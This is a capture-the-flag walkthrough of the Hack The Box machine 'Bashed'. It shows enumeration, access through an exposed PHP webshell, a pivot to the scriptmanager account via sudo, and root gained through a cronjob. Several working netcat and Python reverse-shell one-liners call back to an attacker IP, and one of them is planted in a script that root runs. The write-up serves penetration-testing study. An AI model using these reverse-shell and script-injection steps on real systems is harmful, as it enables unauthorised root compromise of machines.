---
title: "Hack The Box - Bashed"
date: 2020-01-21
tags: [oscp, htb, linux]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Custom webshell and bash terminal"
picture: /assets/htb-bashed/machine_info.png
author_profile: false
---

![](/assets/htb-bashed/machine_info.png)

## Enumeration

Nmap scans show only port 80 is open, running Apache 2.4.18 for Ubuntu.

```
Nmap scan report for 10.10.10.68
Host is up, received user-set (0.050s latency).
Scanned at 2020-01-20 23:22:13 EST for 51s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

The home page talks about a PHP webshell called `bashed` that the owner created, on this very site. Further investigation with Gobuster shows the below directories.

```
/about.html (Status: 200) [Size: 8190]
/config.php (Status: 200) [Size: 0]
/contact.html (Status: 200) [Size: 7802]
/css (Status: 301) [Size: 308]
/dev (Status: 301) [Size: 308]
/fonts (Status: 301) [Size: 310]
/images (Status: 301) [Size: 311]
/index.html (Status: 200) [Size: 7742]
/index.html (Status: 200) [Size: 7742]
/js (Status: 301) [Size: 307]
/php (Status: 301) [Size: 308]
/single.html (Status: 200) [Size: 7476]
/uploads (Status: 301) [Size: 312]
```

---

## Initial Shell

### Enumerate with web shell

Navigating to the `/dev` direcotry, it brings us to a directory listing, which includes a copy of `phpbash.php`. Clicking on `phpbash.php` immediatly places us into the `bashed` webshell mentioned on the homepage. With the `id` and `whoami` commands, we can see that we're running as `www-data`.

![](/assets/htb-bashed/phpbash_initialshell.png)

Some further poking with `uname -a` and `cat /etc/issue` shows that we're on a Ubuntu 16.04 system, running kernel version 4.4.0.

![](/assets/htb-bashed/wwwdata_enum_version.png)

We can confirm with `which nc` that netcat is already installed, which will help with any reverse shells going forward. We can also see a list of user directories with `ls -la /home`.

![](/assets/htb-bashed/wwwdata_nc_homedirs.png)

Besides the obvious `arrexel` username that we assumed from the homepage, there appears to be another user called `scriptmanager`. Both directories look to be readable by `www-data`. Looking in the `/home/scriptmanager` directory shows it's empty, and none of the files are readbale by our current user. We can however navigate to `/home/arrexel` and read `user.txt`.

![](/assets/htb-bashed/user_proof.png)

---

## Privlege Escalation

### Sudoers file

At this point, it makes sense to check if maybe `www-data` has more permissions then it seems. We can use `sudo -l` to see if there are any entires in the sudoers file, which might allow us access as a different user.

![](/assets/htb-bashed/wwwdata_sudoers.png)

Looks like `www-data` can use `sudo` to run any command as `scriptmanager` with no password needed.

### Upgrading the shell

When we try to run anything as `sudo` however, we get a message that *no tty present*. This is common in webshells. It also means it's time to upgrade our shell with netcat.

We first need to start a listener on our machine with `nc -lvnp 7500`. Once that's setup, we can run `/bin/sh | nc 10.10.14.12 7500` on the webshell to kick off the reverse shell.

> NOTE: Although `nc` is installed, it's the OpenBSD version, which does not include the `-e` option to execute a program on conneciton. Instead, we have to pipe `/bin/sh` into the `nc ` command to get the shell.

![](/assets/htb-bashed/revshell_failed.png)

Looks like this is very unstable, and dies right away. Let's try a Python reverse shell with the below command. Don't forget to restart your `nc` listener as well.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",7500));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![](/assets/htb-bashed/python_revshell.png)

It works! Now we have to upgrade the shell to properly run the `sudo` commands we need. We can upgrade to a good `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")'`. Once that shell is spawned, we need to issue some commands to get a good TTY shell.

```shell
CTRL-Z # Sends the netcat session to the background
stty raw -echo # Properly sets terminal to pass CTRL-* commands to the netcat session
fg # Brings the netcat sesison back up
```

![](/assets/htb-bashed/upgraded_python_shell.png)

### Upgrading the shell (again!)

Now that we have access to a TTY shell, we can confirm that using `sudo -u scriptmanager` before a command will run it as `scriptmanager` without the need for a password. HOwever, this can get tiresome really fast. To bypass this, we can simply run `sudo -u scriptmanager /bin/bash`, which will open a `bash` shell as `scriptmanager`.

### Poking the scripts folder

Now that we're finally in a solid shell as `scriptmanager`, we can go poking around.

Running `ls -la /` shows a directory called `/scripts` at the drive root, and it's owned by `scriptmanager`.

![](/assets/htb-bashed/scripts_directory.png)

Inside `/scripts` are two files, `test.py` and `test.txt`. When we read `test.py`, we can see that it simply reads the content of `test.txt`.

![](/assets/htb-bashed/scripts_dir_contents.png)

We can modify the file to test it out with a `ping` back to our machine.

```shell
echo "import os" >> test.py
echo "ip = '10.10.14.12'" >> test.py
echo "command = os.system('ping -c 5 ' + ip)" >> test.py
```

This adds the lines to the existing `test.py` scirpt. We can see the new file below:

```shell
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
import os
ip = '10.10.14.12'
command = os.system('ping -c 5 ' + ip)
```

When we run the script with `python test.py`, we can see the pings going thorugh. We can test this on our end with a `tcpdump` listener using `tcpdump -i tun0 icmp`.

![](/assets/htb-bashed/tcpdump_initial.png)

### Adding our own exploit

In the process of testing, I noticed immediatly that the 5 pings from the `test.py` script were followed up by another 5 pings within the time it took me to take a screenshot. This leads me to beleive that there must be a cronjob running to execute scripts in the `/scripts` folder. If this is the case, then we have our path to `root`.

We can make a simple python script that will initiate a reverse shell when run, using the below command:

```shell
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",7700));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > root_shell.py
```

We setup the listener with `nc -lvnp 7700` and wait. Sure enough, we get a shell back after a short while.

![](/assets/htb-bashed/root_shell.png)

We got `root`! Let's grab the flag.

![](/assets/htb-bashed/root_proof.png)

When we check the `cron` list for `root`, we can see that it was in fact running every `*.py` script in `/scripts`.

![](/assets/htb-bashed/root_cron.png)
